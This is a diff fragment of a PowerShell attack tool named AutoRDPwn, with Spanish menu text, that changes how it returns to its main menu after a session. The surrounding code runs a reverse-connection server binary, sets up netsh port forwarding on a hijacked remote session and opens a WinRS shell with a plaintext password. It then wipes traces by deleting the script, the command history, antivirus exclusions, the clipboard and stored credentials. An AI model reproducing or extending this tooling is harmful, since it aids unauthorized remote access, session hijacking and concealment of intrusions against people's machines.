         $Host.UI.RawUI.ForegroundColor = 'Green' ; if($sticky){ $stickyshadow = "sticky" ; $inputoption = "sticky"} elseif($shadowoption -like '-shadow') { $inputoption=$args[7] }
@@ -765,7 +819,7 @@ try { Clear-Host ; .\server.exe $webrevip $webrevport ; del .\server.exe } final
 
 if ($remoteforward){ invoke-command -session $RDP[0] -scriptblock { netsh interface portproxy add v4tov4 listenport=$using:rlport listenaddress=$using:rlhost connectport=$using:rrport connectaddress=$using:rrhost }}
 if ($console){ $PlainTextPassword = ConvertFrom-SecureToPlain $password ; Clear-Host ; Write-Host ">> $txt39 <<" ; Write-Host ; WinRS -r:$computer -u:$user -p:$PlainTextPassword "cmd" }}
-else { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 } if($tsfail) { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
+else { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; if(!$option){ Get-AttackHint -Computer $computer } ; Start-Sleep -milliseconds 3000 } if($tsfail) { Write-Host ; Write-Host "[!] $txt40" -ForegroundColor Red ; Start-Sleep -milliseconds 2000 }}
 
 if ($noclean -or $nogui) { $null } else { Write-Host ; Write-Host "[!] $txt75" -ForegroundColor Red ; Start-Sleep -milliseconds 1000
 if ($ViewerProcess) { $null = $ViewerProcess.WaitForExit() }
@@ -776,11 +830,15 @@ if ($ViewerProcess) { $null = $ViewerProcess.WaitForExit() }
         & $question ; Write-Host "Selecciona una opcion [R/M/X]: " -NoNewLine -ForegroundColor Gray ; $postaction = $Host.UI.ReadLine() ; if(!$postaction){ $postaction = 'X' }
         if($postaction -in 'R','r','reconectar','reconnect') { Write-Host ; $ViewerProcess = Start-RemoteViewer -computer $computer -user $user -PlainTextPassword $PlainTextPassword -control $control -shadow $shadow -sticky $sticky -vncserver $vncserver
         if($ViewerProcess){ $null = $ViewerProcess.WaitForExit() }}
-        if($postaction -in 'M','m','menu') { Write-Host ; Write-Host "[i] Reiniciando AutoRDPwn..." -ForegroundColor Green ; Start-Sleep -milliseconds 750
-        if($local){ Start-Process powershell -ArgumentList "-sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`" -noadmin" -WorkingDirectory $localpath }
-        else { Start-Process powershell -ArgumentList "-sta -NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -WorkingDirectory (Get-Location).path }
-        $postaction = 'X' }
+        if($postaction -in 'M','m','menu') { Write-Host ; Write-Host "[i] Volviendo al menu principal (sin reiniciar AutoRDPwn).." -ForegroundColor Green ; Start-Sleep -milliseconds 500
+        $backtomenu = 'true' ; $postaction = 'X' }
         if($postaction -notin 'R','r','reconectar','reconnect','M','m','menu','X','x','salir','exit') { Write-Host "[!] $txt6" -ForegroundColor Red ; Start-Sleep -milliseconds 1000 }} until ($postaction -in 'X','x','salir','exit')
+if($backtomenu -ne 'true') {
 if ($attack) { Start-Sleep -milliseconds 1000 ; Write-Host ; Write-Host "[+] $txt77" -ForegroundColor Blue ; Start-Sleep -milliseconds 1500 }
 if (!$local) { $PScript = $MyInvocation.MyCommand.Definition ; Remove-Item $PScript } ; del (Get-PSReadlineOption).HistorySavePath ; Remove-Exclusions 2>&1> $null ; Set-Clipboard $null 2>&1> $null ; cmdkey /del $computer 2>&1> $null
-Write-Host ; Write-Host "[i] $txt76" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }
+Write-Host ; Write-Host "[i] $txt76" -ForegroundColor Green ; Start-Sleep -milliseconds 2000 }}
+if($backtomenu -eq 'true'){ Write-Host "[i] De vuelta al menu principal.." -ForegroundColor Green ; Start-Sleep -milliseconds 500
+$input = $null ; $postaction = $null ; $backtomenu = $null ; $attack = $null ; $hash = $null ; $control = $null ; $shadow = $null ; $sticky = $null ; $vncserver = $null ; $smbshell = $null ; $console = $null ; $revshell = $null ; $netcat = $null ; $getkeys = $null ; $webserver = $null ; $metasploit = $null ; $remoteforward = $null ; $tsfail = $null ; $ViewerProcess = $null ; $credential = $null ; $password = $null ; $PlainTextPassword = $null
+if($RDP){ $RDP | Remove-PSSession -ErrorAction SilentlyContinue 2>&1> $null ; $RDP = $null } ; $reload = 'true' }
+else { $reload = 'false' }
+} while ($reload -eq 'true')
